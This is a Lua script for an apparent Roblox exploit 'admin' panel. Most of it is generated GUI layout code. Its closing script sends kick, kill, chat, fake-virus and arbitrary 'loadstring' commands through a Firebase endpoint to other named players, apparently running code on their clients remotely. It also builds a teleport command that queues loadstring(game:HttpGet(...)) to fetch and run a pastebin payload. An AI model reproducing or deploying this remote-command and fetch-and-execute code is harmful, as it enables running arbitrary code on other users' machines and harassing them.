-- Gui to Lua
-- Version: 3.2

-- Instances:

local AdminOPBGGUI = Instance.new("ScreenGui")
local TopBar = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local Close = Instance.new("TextButton")
local UISizeConstraint = Instance.new("UISizeConstraint")
local UICorner = Instance.new("UICorner")
local Minimize = Instance.new("TextButton")
local UISizeConstraint_2 = Instance.new("UISizeConstraint")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local UserBox = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local UIGradient_3 = Instance.new("UIGradient")
local MessageBox = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local UIGradient_4 = Instance.new("UIGradient")
local Frame = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local ChatButton = Instance.new("TextButton")
local UIGradient_5 = Instance.new("UIGradient")
local UICorner_5 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UISizeConstraint_3 = Instance.new("UISizeConstraint")
local IdiotButton = Instance.new("TextButton")
local UIGradient_6 = Instance.new("UIGradient")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local UISizeConstraint_4 = Instance.new("UISizeConstraint")
local KickButton = Instance.new("TextButton")
local UIGradient_7 = Instance.new("UIGradient")
local UICorner_7 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local UISizeConstraint_5 = Instance.new("UISizeConstraint")
local KillButton = Instance.new("TextButton")
local UIGradient_8 = Instance.new("UIGradient")
local UICorner_8 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local UISizeConstraint_6 = Instance.new("UISizeConstraint")
local LoadstrButton = Instance.new("TextButton")
local UIGradient_9 = Instance.new("UIGradient")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local UISizeConstraint_7 = Instance.new("UISizeConstraint")
local JoinServerButton = Instance.new("TextButton")
local UIGradient_10 = Instance.new("UIGradient")
local UICorner_10 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local UISizeConstraint_8 = Instance.new("UISizeConstraint")

--Properties:

AdminOPBGGUI.Name = "AdminOPBGGUI"
AdminOPBGGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
AdminOPBGGUI.ResetOnSpawn = false

TopBar.Name = "TopBar"
TopBar.Parent = AdminOPBGGUI
TopBar.Active = true
TopBar.BackgroundColor3 = Color3.fromRGB(4, 0, 67)
TopBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
TopBar.BorderSizePixel = 0
TopBar.Position = UDim2.new(0.0169280116, 0, 0.473251015, 0)
TopBar.Size = UDim2.new(0, 357, 0, 30)
TopBar.ZIndex = 2

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Parent = TopBar

Close.Name = "Close"
Close.Parent = TopBar
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 0.950
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.916201115, 0, 0, 0)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.ZIndex = 3
Close.AutoButtonColor = false
Close.Font = Enum.Font.ArialBold
Close.Text = "x"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 20.000

UISizeConstraint.Parent = Close
UISizeConstraint.MaxSize = Vector2.new(30, 30)
UISizeConstraint.MinSize = Vector2.new(30, 30)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = TopBar

Minimize.Name = "Minimize"
Minimize.Parent = TopBar
Minimize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minimize.BackgroundTransparency = 0.950
Minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
Minimize.BorderSizePixel = 0
Minimize.Position = UDim2.new(0.832402229, 0, 0, 0)
Minimize.Size = UDim2.new(0, 30, 0, 30)
Minimize.ZIndex = 3
Minimize.AutoButtonColor = false
Minimize.Font = Enum.Font.ArialBold
Minimize.Text = "-"
Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimize.TextSize = 20.000

UISizeConstraint_2.Parent = Minimize
UISizeConstraint_2.MaxSize = Vector2.new(30, 30)
UISizeConstraint_2.MinSize = Vector2.new(30, 30)

Main.Name = "Main"
Main.Parent = TopBar
Main.BackgroundColor3 = Color3.fromRGB(3, 0, 39)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.LayoutOrder = -5
Main.Position = UDim2.new(4.3103924e-08, 0, 0.148491412, 0)
Main.Size = UDim2.new(0, 357, 0, 213)

UICorner_2.CornerRadius = UDim.new(0, 20)
UICorner_2.Parent = Main

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Parent = Main

UserBox.Name = "UserBox"
UserBox.Parent = Main
UserBox.BackgroundColor3 = Color3.fromRGB(0, 1, 59)
UserBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
UserBox.BorderSizePixel = 0
UserBox.Position = UDim2.new(0.0188723858, 0, 0.158450708, 0)
UserBox.Size = UDim2.new(0, 169, 0, 42)
UserBox.ClearTextOnFocus = false
UserBox.Font = Enum.Font.Unknown
UserBox.PlaceholderColor3 = Color3.fromRGB(50, 118, 58)
UserBox.PlaceholderText = "Username"
UserBox.Text = ""
UserBox.TextColor3 = Color3.fromRGB(255, 255, 255)
UserBox.TextSize = 20.000

UICorner_3.CornerRadius = UDim.new(0, 5)
UICorner_3.Parent = UserBox

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_3.Parent = UserBox

MessageBox.Name = "MessageBox"
MessageBox.Parent = Main
MessageBox.BackgroundColor3 = Color3.fromRGB(0, 1, 59)
MessageBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
MessageBox.BorderSizePixel = 0
MessageBox.Position = UDim2.new(0.509068549, 0, 0.158450708, 0)
MessageBox.Size = UDim2.new(0, 169, 0, 42)
MessageBox.ClearTextOnFocus = false
MessageBox.Font = Enum.Font.Unknown
MessageBox.PlaceholderColor3 = Color3.fromRGB(50, 118, 58)
MessageBox.PlaceholderText = "Message"
MessageBox.Text = ""
MessageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
MessageBox.TextSize = 12.000

UICorner_4.CornerRadius = UDim.new(0, 5)
UICorner_4.Parent = MessageBox

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_4.Parent = MessageBox

Frame.Parent = Main
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-4.27417071e-08, 0, 0.355633646, 0)
Frame.Size = UDim2.new(0, 357, 0, 136)

UIGridLayout.Parent = Frame
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 5)
UIGridLayout.CellSize = UDim2.new(0, 50, 0, 10)

ChatButton.Name = "ChatButton"
ChatButton.Parent = Frame
ChatButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
ChatButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatButton.BorderSizePixel = 0
ChatButton.Position = UDim2.new(0.559292972, 0, 0.39084506, 0)
ChatButton.Size = UDim2.new(0, 121, 0, 33)
ChatButton.AutoButtonColor = false
ChatButton.Font = Enum.Font.SourceSans
ChatButton.Text = ""
ChatButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ChatButton.TextSize = 16.000
ChatButton.TextWrapped = true

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_5.Parent = ChatButton

UICorner_5.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_5.Parent = ChatButton

TextLabel.Parent = ChatButton
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel.Size = UDim2.new(0, 93, 0, 22)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "Chat"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

UISizeConstraint_3.Parent = ChatButton
UISizeConstraint_3.MaxSize = Vector2.new(121, 33)
UISizeConstraint_3.MinSize = Vector2.new(121, 33)

IdiotButton.Name = "IdiotButton"
IdiotButton.Parent = Frame
IdiotButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
IdiotButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
IdiotButton.BorderSizePixel = 0
IdiotButton.Position = UDim2.new(0.329601079, 0, 0.780516446, 0)
IdiotButton.Size = UDim2.new(0, 153, 0, 33)
IdiotButton.AutoButtonColor = false
IdiotButton.Font = Enum.Font.SourceSans
IdiotButton.Text = ""
IdiotButton.TextColor3 = Color3.fromRGB(255, 255, 255)
IdiotButton.TextSize = 16.000
IdiotButton.TextWrapped = true

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_6.Parent = IdiotButton

UICorner_6.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_6.Parent = IdiotButton

TextLabel_2.Parent = IdiotButton
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel_2.Size = UDim2.new(0, 93, 0, 22)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "You are an idiot virus (fake)"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 14.000

UISizeConstraint_4.Parent = IdiotButton
UISizeConstraint_4.MaxSize = Vector2.new(121, 33)
UISizeConstraint_4.MinSize = Vector2.new(121, 33)

KickButton.Name = "KickButton"
KickButton.Parent = Frame
KickButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
KickButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
KickButton.BorderSizePixel = 0
KickButton.Position = UDim2.new(0.119517051, 0, 0.39084506, 0)
KickButton.Size = UDim2.new(0, 121, 0, 33)
KickButton.AutoButtonColor = false
KickButton.Font = Enum.Font.SourceSans
KickButton.Text = ""
KickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
KickButton.TextSize = 16.000
KickButton.TextWrapped = true

UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_7.Parent = KickButton

UICorner_7.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_7.Parent = KickButton

TextLabel_3.Parent = KickButton
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel_3.Size = UDim2.new(0, 93, 0, 22)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "Kick"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000

UISizeConstraint_5.Parent = KickButton
UISizeConstraint_5.MaxSize = Vector2.new(121, 33)
UISizeConstraint_5.MinSize = Vector2.new(121, 33)

KillButton.Name = "KillButton"
KillButton.Parent = Frame
KillButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
KillButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
KillButton.BorderSizePixel = 0
KillButton.Position = UDim2.new(0.119517051, 0, 0.573943675, 0)
KillButton.Size = UDim2.new(0, 121, 0, 33)
KillButton.AutoButtonColor = false
KillButton.Font = Enum.Font.SourceSans
KillButton.Text = ""
KillButton.TextColor3 = Color3.fromRGB(255, 255, 255)
KillButton.TextSize = 16.000
KillButton.TextWrapped = true

UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_8.Parent = KillButton

UICorner_8.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_8.Parent = KillButton

TextLabel_4.Parent = KillButton
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel_4.Size = UDim2.new(0, 93, 0, 22)
TextLabel_4.Font = Enum.Font.Unknown
TextLabel_4.Text = "Kill"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 14.000

UISizeConstraint_6.Parent = KillButton
UISizeConstraint_6.MaxSize = Vector2.new(121, 33)
UISizeConstraint_6.MinSize = Vector2.new(121, 33)

LoadstrButton.Name = "LoadstrButton"
LoadstrButton.Parent = Frame
LoadstrButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
LoadstrButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
LoadstrButton.BorderSizePixel = 0
LoadstrButton.Position = UDim2.new(0.559292972, 0, 0.569248855, 0)
LoadstrButton.Size = UDim2.new(0, 121, 0, 33)
LoadstrButton.AutoButtonColor = false
LoadstrButton.Font = Enum.Font.SourceSans
LoadstrButton.Text = ""
LoadstrButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadstrButton.TextSize = 16.000
LoadstrButton.TextWrapped = true

UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_9.Parent = LoadstrButton

UICorner_9.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_9.Parent = LoadstrButton

TextLabel_5.Parent = LoadstrButton
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel_5.Size = UDim2.new(0, 93, 0, 22)
TextLabel_5.Font = Enum.Font.Unknown
TextLabel_5.Text = "Loadstring"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 14.000

UISizeConstraint_7.Parent = LoadstrButton
UISizeConstraint_7.MaxSize = Vector2.new(121, 33)
UISizeConstraint_7.MinSize = Vector2.new(121, 33)

JoinServerButton.Name = "JoinServerButton"
JoinServerButton.Parent = Frame
JoinServerButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
JoinServerButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
JoinServerButton.BorderSizePixel = 0
JoinServerButton.Position = UDim2.new(0.559292972, 0, 0.569248855, 0)
JoinServerButton.Size = UDim2.new(0, 121, 0, 33)
JoinServerButton.AutoButtonColor = false
JoinServerButton.Font = Enum.Font.SourceSans
JoinServerButton.Text = ""
JoinServerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
JoinServerButton.TextSize = 16.000
JoinServerButton.TextWrapped = true

UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_10.Parent = JoinServerButton

UICorner_10.CornerRadius = UDim.new(0.00999999978, 3)
UICorner_10.Parent = JoinServerButton

TextLabel_6.Parent = JoinServerButton
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
TextLabel_6.Size = UDim2.new(0, 93, 0, 22)
TextLabel_6.Font = Enum.Font.Unknown
TextLabel_6.Text = "Force to join this server"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 14.000

UISizeConstraint_8.Parent = JoinServerButton
UISizeConstraint_8.MaxSize = Vector2.new(121, 33)
UISizeConstraint_8.MinSize = Vector2.new(121, 33)

-- Scripts:

local function TOODT_fake_script() -- Main.LocalScript 
	local script = Instance.new('LocalScript', Main)

	local topbar = script.Parent.Parent
	local http_request = http_request or (function()
		if game:GetService('RunService'):IsServer() then
			return function(...)
				return game:GetService('HttpService'):RequestAsync(...) 
			end 
		elseif script and not writefile then
			return function(...)
				print('http request called')
				print(...)
				local packed = table.pack(...)
				packed['n'] = nil
				return game:GetService('ReplicatedStorage'):FindFirstChild('remoteListen'):InvokeServer(packed)
			end
		end
	end)()
	-- dragging ig
	script.Parent.InputBegan:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1 and inp.UserInputState == Enum.UserInputState.Begin then
			local dragStart = inp.Position
			local startPos = topbar.Position
	
			local connection
			connection = script.Parent.InputChanged:Connect(function(change)
				if change.UserInputType == Enum.UserInputType.MouseMovement then
					local delta = change.Position - dragStart
					topbar:TweenPosition(
						UDim2.new(
							startPos.X.Scale,
							startPos.X.Offset + delta.X,
							startPos.Y.Scale,
							startPos.Y.Offset + delta.Y
						),
						"Out",
						"Quad",
						0.05,
						true
					)
				end
			end)
			script.Parent.InputEnded:Connect(function(endInput)
				if endInput.UserInputType == Enum.UserInputType.MouseButton1 then
					if connection then
						connection:Disconnect()
					end
				end
			end)
		end
	end)
	-- butt-ons, get it? butt on?
	topbar.Minimize.MouseButton1Click:Connect(function()
		script.Parent.Visible = not script.Parent.Visible
	end)
	
	topbar.Close.MouseButton1Click:Connect(function()
		local speed = 0.01
		while topbar.Transparency<1 do
			for _,v in topbar:GetDescendants() do
				pcall(function()
					v['Transparency'] = v['Transparency']+speed
				end)
			end
			topbar.Transparency=topbar.Transparency+speed
			task.wait(0.01)
		end
		if topbar.Transparency>=1 then
            script.Parent.Parent.Parent:Destroy()
        else
            while topbar.Transparency<1 do
			    for _,v in topbar:GetDescendants() do
				    pcall(function()
				    	v['Transparency'] = v['Transparency']+speed
				    end)
			    end
			    topbar.Transparency=topbar.Transparency+speed
			    task.wait(0.01)
		    end
        end
	end)
	
	
	
	local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
	local sayMessage
	if not legacyChat then
		sayMessage = function(msg)
			game.TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
		end
	elseif legacyChat then
		sayMessage = function(msg)
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
		end
	end
	local function sendCommand(username, command,msg)
	
		pcall(function() 
			http_request({
				Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
				Method = "PATCH",
				Body = game:GetService('HttpService'):JSONEncode({ [username] = { command = command, message = msg} }),
				Headers = { ["Content-Type"] = "application/json" }
			})
		end)
	end
	
	script.Parent.Frame.KickButton.MouseButton1Click:Connect(function()
		sendCommand(script.Parent.UserBox.Text,'kick',script.Parent.MessageBox.Text)
	end)
	script.Parent.Frame.ChatButton.MouseButton1Click:Connect(function()
		sendCommand(script.Parent.UserBox.Text,'chat',script.Parent.MessageBox.Text)
	end)
	script.Parent.Frame.LoadstrButton.MouseButton1Click:Connect(function()
		sendCommand(script.Parent.UserBox.Text,'loadstr',script.Parent.MessageBox.Text)
	end)
	script.Parent.Frame.KillButton.MouseButton1Click:Connect(function()
		sendCommand(script.Parent.UserBox.Text,'kill',script.Parent.MessageBox.Text)
	end)
	script.Parent.Frame.IdiotButton.MouseButton1Click:Connect(function()
		sendCommand(script.Parent.UserBox.Text,'idiot',script.Parent.MessageBox.Text)
	end)
	
	script.Parent.Frame.JoinServerButton.MouseButton1Click:Connect(function()
		local jobId = tostring(game.JobId)
		local str = "function tpJobId(jobId) game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer) end queue_on_teleport(\"loadstring(game:HttpGet('https://pastebin.com/raw/WMQdb4zD'))()\") tpJobId('" .. jobId .. "')"
		sendCommand(script.Parent.UserBox.Text,'loadstr',str)
	end)
end
coroutine.wrap(TOODT_fake_script)()
